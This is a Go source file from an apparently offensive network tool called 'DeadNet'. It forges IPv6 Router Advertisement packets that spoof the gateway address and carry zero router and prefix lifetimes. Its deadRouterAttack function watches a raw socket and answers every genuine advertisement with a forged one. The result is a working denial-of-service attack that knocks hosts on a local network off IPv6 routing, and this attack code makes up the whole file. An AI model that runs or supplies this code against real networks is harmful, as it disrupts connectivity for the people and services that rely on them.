package main

import (
	"context"
	"encoding/binary"
	"errors"
	"net"
	"syscall"
	"time"

	"deadnet/utils"
)

func (d *DeadNet) sendRouterAdvertisement(zeroLifetime bool) error {
	destIP := net.ParseIP(utils.IPv6MulticastAddr)
	if destIP == nil || d.gatewayIPv6Addr == nil {
		return errors.New("invalid IPv6 configuration")
	}
	randMAC, err := utils.RandomMAC()
	if err != nil {
		return err
	}

	raHeader := make([]byte, 16)
	raHeader[0] = 134
	raHeader[4] = 255
	if zeroLifetime {
		binary.BigEndian.PutUint16(raHeader[6:8], 0)
	} else {
		binary.BigEndian.PutUint16(raHeader[6:8], 1800)
	}
	// reachability + retrans timer remain zero

	srcOpt := make([]byte, 8)
	srcOpt[0] = 1
	srcOpt[1] = 1
	copy(srcOpt[2:], randMAC)

	mtuOpt := make([]byte, 8)
	mtuOpt[0] = 5
	mtuOpt[1] = 1
	binary.BigEndian.PutUint32(mtuOpt[4:], 1500)

	prefixOpt := make([]byte, 32)
	prefixOpt[0] = 3
	prefixOpt[1] = 4
	prefixOpt[2] = byte(d.ipv6PrefLen)
	prefixOpt[3] = 0xc0
	// valid + preferred lifetime zeroed
	copy(prefixOpt[16:], d.prefixIPv6.To16())

	payload := raHeader
	payload = append(payload, srcOpt...)
	payload = append(payload, mtuOpt...)
	payload = append(payload, prefixOpt...)

	checksum := utils.IPv6Checksum(d.gatewayIPv6Addr, destIP, payload)
	binary.BigEndian.PutUint16(payload[2:4], checksum)

	ipv6Header := make([]byte, 40)
	ipv6Header[0] = 0x60
	binary.BigEndian.PutUint16(ipv6Header[4:6], uint16(len(payload)))
	ipv6Header[6] = 58
	ipv6Header[7] = 255
	copy(ipv6Header[8:24], d.gatewayIPv6Addr.To16())
	copy(ipv6Header[24:], destIP.To16())

	packet := append(ipv6Header, payload...)
	frame := buildEthernetFrame(multicastMAC(destIP), randMAC, ethPIPv6, packet)
	return d.rawSender.send(frame, ethPIPv6, multicastMAC(destIP))
}

func multicastMAC(ip net.IP) net.HardwareAddr {
	ip = ip.To16()
	if ip == nil {
		return broadcastMAC
	}
	return net.HardwareAddr{0x33, 0x33, ip[12], ip[13], ip[14], ip[15]}
}

func (d *DeadNet) deadRouterAttack(ctx context.Context) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPIPv6)))
	if err != nil {
		utils.Printf("%s[!]%s IPv6 monitor error: %v", utils.Red, utils.White, err)
		return
	}
	defer syscall.Close(fd)

	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(ethPIPv6), Ifindex: d.iface.Index}); err != nil {
		utils.Printf("%s[!]%s IPv6 bind error: %v", utils.Red, utils.White, err)
		return
	}
	_ = syscall.SetNonblock(fd, true)

	buf := make([]byte, 65535)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if err == syscall.EAGAIN {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			utils.Printf("%s[!]%s IPv6 recv error: %v", utils.Red, utils.White, err)
			return
		}
		if isRouterAdvertisement(buf[:n]) {
			if err := d.sendRouterAdvertisement(true); err != nil {
				utils.Printf("%s[!]%s Failed to send forged RA: %v", utils.Red, utils.White, err)
			}
		}
	}
}

func isRouterAdvertisement(frame []byte) bool {
	if len(frame) < 54 {
		return false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != ethPIPv6 {
		return false
	}
	ipv6 := frame[14:]
	if len(ipv6) < 40 {
		return false
	}
	if ipv6[6] != 58 {
		return false
	}
	payload := ipv6[40:]
	if len(payload) == 0 {
		return false
	}
	return payload[0] == 134
}
